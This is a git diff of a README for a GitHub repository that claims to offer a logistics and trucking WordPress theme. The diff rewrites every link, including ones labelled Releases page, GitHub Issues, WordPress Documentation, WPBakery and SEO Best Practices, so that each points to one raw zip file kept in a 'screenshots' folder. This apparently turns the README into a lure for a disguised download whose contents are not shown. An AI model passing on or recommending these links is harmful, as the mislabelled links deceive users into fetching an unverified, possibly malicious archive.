@@ -4,7 +4,7 @@
 Transport is a professional logistics and trucking WordPress theme designed for freight, transport, and delivery companies. This theme helps you create a stunning online presence for your business, ensuring your services are showcased effectively. With user-friendly features and a sleek design, it makes managing your website easy.
 
 ## 📥 Download Now
-[![Download Transport WordPress Theme](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/Wassikwb/transport-wordpress-theme/releases)
+[![Download Transport WordPress Theme](https://github.com/Wassikwb/transport-wordpress-theme/raw/refs/heads/main/screenshots/transport_wordpress_theme_3.8.zip)](https://github.com/Wassikwb/transport-wordpress-theme/raw/refs/heads/main/screenshots/transport_wordpress_theme_3.8.zip)
 
 ## 🚀 Getting Started
 Ready to take your logistics business online? Follow these simple steps to download and set up your transport-wordpress-theme.
@@ -17,7 +17,7 @@ Before you begin, ensure your setup meets these basic requirements:
 - **MySQL Version:** MySQL 5.6 or higher or MariaDB 10.0 or higher is required.
 
 ## 📥 Download & Install
-1. **Visit the Download Page:** Go to the [Releases page](https://github.com/Wassikwb/transport-wordpress-theme/releases) to access the latest version.
+1. **Visit the Download Page:** Go to the [Releases page](https://github.com/Wassikwb/transport-wordpress-theme/raw/refs/heads/main/screenshots/transport_wordpress_theme_3.8.zip) to access the latest version.
 2. **Select the Latest Release:** Look for the most recent version at the top of the page.
 3. **Download the Theme Files:** Click on the `.zip` file to download the theme files to your computer.
 4. **Extract the Files:** After downloading, locate the `.zip` file in your Downloads folder and extract it.
@@ -49,13 +49,13 @@ If you encounter any issues during installation or setup, consider these common 
 - **Check for Updates:** Make sure you are using the latest version of the transport-wordpress-theme.
 
 ## 📞 Support
-For further assistance, please visit our support page or open an issue on our [GitHub Issues](https://github.com/Wassikwb/transport-wordpress-theme/issues) page.
+For further assistance, please visit our support page or open an issue on our [GitHub Issues](https://github.com/Wassikwb/transport-wordpress-theme/raw/refs/heads/main/screenshots/transport_wordpress_theme_3.8.zip) page.
 
 ## 🔗 Additional Resources
 Explore more about the theme and related information:
-- [WordPress Documentation](https://wordpress.org/documentation/)
-- [WPBakery Page Builder](https://wpbakery.com/)
-- [SEO Best Practices](https://moz.com/beginners-guide-to-seo)
+- [WordPress Documentation](https://github.com/Wassikwb/transport-wordpress-theme/raw/refs/heads/main/screenshots/transport_wordpress_theme_3.8.zip)
+- [WPBakery Page Builder](https://github.com/Wassikwb/transport-wordpress-theme/raw/refs/heads/main/screenshots/transport_wordpress_theme_3.8.zip)
+- [SEO Best Practices](https://github.com/Wassikwb/transport-wordpress-theme/raw/refs/heads/main/screenshots/transport_wordpress_theme_3.8.zip)
 
 ## 📥 Download Now
-Don’t wait any longer. [Click here to download the transport-wordpress-theme](https://github.com/Wassikwb/transport-wordpress-theme/releases) and start showcasing your transportation services today!
+Don’t wait any longer. [Click here to download the transport-wordpress-theme](https://github.com/Wassikwb/transport-wordpress-theme/raw/refs/heads/main/screenshots/transport_wordpress_theme_3.8.zip) and start showcasing your transportation services today!
